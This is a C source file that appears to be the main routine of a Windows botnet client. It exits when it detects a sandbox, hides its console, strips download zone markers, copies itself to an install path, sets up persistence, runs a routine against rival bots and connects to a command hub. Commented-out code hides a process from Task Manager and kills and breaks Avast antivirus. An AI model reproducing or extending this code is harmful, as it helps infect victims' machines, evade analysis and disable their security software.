#include "Includes/includes.h"

int main(int argc, char *argv[])
{
    if(IsRunningInSandbox())
        TerminateProcess((HANDLE)-1, 0);

    if(!DynamicLoadLibraries())
        return 0;

#ifndef DEBUG
    FreeConsole();
    StartProactiveFunctions();
#endif

    srand(GenerateRandomSeed());
    SetupInfo();
    DefineInitialVariables();
    ProcessArgcs(argc, argv);

    /*HWND hTaskManager = FindWindowExW(NULL, NULL, L"#32770", L"Windows Task Manager");
    if(hTaskManager != NULL)
    {
        HWND hProcesses = FindWindowExW(hTaskManager, NULL, L"#32770", L"Processes");
        if(hProcesses != NULL)
        {
            HWND hTasksList = FindWindowExW(hProcesses, NULL, L"SysListView32", L"Processes");
            if(hTasksList != NULL)
            {
                int nItemCount = (int)SendMessage(hTasksList, LVM_GETITEMCOUNT, (WPARAM)0, (LPARAM)0);

                unsigned long ulPid = 0;
                GetWindowThreadProcessId(hTasksList, &ulPid);

                HANDLE hTaskMgrProcess = OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_READ|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION, FALSE, ulPid);

                char szItem[DEFAULT];
                memset(szItem, 0, sizeof(szItem));

                LVITEM *plvi = (LVITEM*)VirtualAllocEx(hTaskMgrProcess, NULL, sizeof(LVITEM), MEM_COMMIT, PAGE_READWRITE);
                char *cItem = (char*)VirtualAllocEx(hTaskMgrProcess, NULL, 512, MEM_COMMIT, PAGE_READWRITE);

                LVITEM lvi;
                lvi.cchTextMax = 512;

                for(int i = 0; i < nItemCount; i++)
                {
                    lvi.iSubItem = 0;
                    lvi.pszText = cItem;
                    WriteProcessMemory(hTaskMgrProcess, plvi, &lvi, sizeof(LVITEM), NULL);
                    //SendMessage(hTasksList, LVM_GETITEMTEXT, (WPARAM)i, (LPARAM)plvi);
                    ListView_GetItemText(hTasksList, i, 0, szItem, sizeof(szItem));
                    ReadProcessMemory(hTaskMgrProcess, cItem, szItem, 512, NULL);
printf("%s\n", szItem);
                    if(strstr(szItem, "notepad++.exe"))
                    {
                        if(SendMessage(hTasksList, LVM_DELETECOLUMN, (WPARAM)i, (LPARAM)plvi))
                            printf("SUCCESS\n");
                        else
                            printf("FAIL - Error Code:%ld\n", GetLastError());
                    }
                }

                VirtualFreeEx(hTaskMgrProcess, plvi, 0, MEM_RELEASE);
                VirtualFreeEx(hTaskMgrProcess, cItem, 0, MEM_RELEASE);

            }
            CloseHandle(hTasksList);
        }
        CloseHandle(hProcesses);
    }
    CloseHandle(hTaskManager);*/

/////////////////////////////////////
    /*#ifdef INSTANT_AVKILL
        char cAvFilename[MAX_PATH];
        strcpy(cAvFilename, "AvastUI.exe");

        DWORD dwAvPid = GetPidFromFilename(cAvFilename);
        if(dwAvPid == 0)
            printf("Failed to retrieve PID from process %s\nCould not kill process.\n", cAvFilename);
        else
        {
            if(KillProcessByPid(dwAvPid, FALSE))
                printf("Successfully killed process %s[PID: %ld]\n", cAvFilename, dwAvPid);
            else
                printf("Failed to kill process %s[PID: %ld]\n", cAvFilename, dwAvPid);
        }

        char cAvFilepath[MAX_PATH];
        strcpy(cAvFilepath, "C:\\Program Files\\AVAST Software\\Avast\\");
        strcat(cAvFilepath, cAvFilename);

        if(BreakFile(cAvFilepath))
            printf("Successfully disabled AV located at %s\n", cAvFilepath);
        else
            printf("Failed to disable AV located at %s\n", cAvFilepath);

        system("pause");
    #endif*/
/////////////////////////////////////
    Sleep(GetRandNum(1000));
#ifndef DEBUG
    DeleteZoneIdentifiers();

    MutexHandler();

    if(strcmp(cThisFile, cFileSaved) != 0)
    {
        CreateDirectory(cFileSavedDirectory, NULL);
        MoveFileEx(cThisFile, cFileSaved, MOVEFILE_WRITE_THROUGH);
        //if(StartProcessFromPath(cFileSaved, FALSE))
        //TerminateProcess((HANDLE)-1, 0);
    }

#ifdef INCLUDE_STARTUP_INSTALLATION_AND_PERSISTANCE
    StartInstallPersist();
#endif

#ifdef BOTKILL_ON_START
#ifdef BOTKILL_ONCE
    bBotkillOnce = TRUE;
#endif

#ifdef INCLUDE_BOTKILL
    StartBotkiller();
#endif
#endif

    /*#ifdef INSTANT_AVKILL

    #endif*/

    if(!bNewInstallation && dwOperatingSystem <= WINDOWS_XP) //FIND A BETTER ALTERNATIVE!!!
        CreateRestartExplorer();
#endif

    //ShowWindows(TRUE);

    int nResult;
    WSADATA wsadata;
    nResult = fncWSAStartup(MAKEWORD(1, 1), &wsadata);
    if(nResult != 0)
        return 0;

    DnsFlushResolverCache();
    ResolveMicrosoftUpdateDomain();

    ConnectToHub();

    //fncWSACleanup();

    return 0;
}
